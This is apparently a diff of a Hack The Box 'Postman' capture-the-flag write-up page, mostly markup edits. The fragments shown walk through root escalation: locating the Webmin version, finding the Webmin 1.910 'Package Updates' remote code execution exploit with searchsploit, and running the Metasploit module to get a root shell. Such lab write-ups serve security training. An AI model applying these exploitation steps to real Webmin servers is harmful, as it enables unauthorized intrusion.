 <figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">redis@Postman:~$</span><span class="w"> </span>su Matt
 <span class="go">Password: 
@@ -469,7 +462,7 @@ Connection closed by 10.10.10.160 port 22</span></code></pre></figure>
 
 <h2 id="4-root">4. Root</h2>
 
-<p>As we remember we got a <strong>Webmin</strong> app running on port <code class="highlighter-rouge">10000</code>. Now we can see what version is running on the box and search for any vulnerabilities with <code class="highlighter-rouge">searchsploit</code>.</p>
+<p>As we remember we got a <strong>Webmin</strong> app running on port <code class="language-plaintext highlighter-rouge">10000</code>. Now we can see what version is running on the box and search for any vulnerabilities with <code class="language-plaintext highlighter-rouge">searchsploit</code>.</p>
 
 <figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">Matt@Postman:/var/lib/redis$</span><span class="w"> </span>find / <span class="nt">-type</span> f <span class="nt">-ls</span> 2&gt;/dev/null | <span class="nb">grep </span>webmin | <span class="nb">grep </span>version | <span class="nb">head</span> <span class="nt">-5</span>
 <span class="go">   280138      4 -rw-r--r--   1 root            root                    6 Aug 25 17:26 /etc/webmin/version
@@ -489,7 +482,7 @@ Webmin 1.910 - 'Package Updates' Remote Co | exploits/linux/remote/46984.rb
 ------------------------------------------- ----------------------------------------
 Shellcodes: No Result</span></code></pre></figure>
 
-<p>We found <code class="highlighter-rouge">Package Updates RCE</code> with <code class="highlighter-rouge">Metasploit</code> module. Let’s run it and own root:</p>
+<p>We found <code class="language-plaintext highlighter-rouge">Package Updates RCE</code> with <code class="language-plaintext highlighter-rouge">Metasploit</code> module. Let’s run it and own root:</p>
 
 <figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">msf5 &gt;</span><span class="w"> </span>search webmin
 <span class="go">
@@ -582,7 +575,7 @@ uid=0(root) gid=0(root) groups=0(root)
 <script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>
 
 
-  <script type="text/javascript" src="/assets/themetoggle-df0d3d73164dc26dffbd630182ae4d0dfa7bee6b694a2b5d565d73595b582bbf.js"></script>
 
+<script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>
 </body>
 </html>
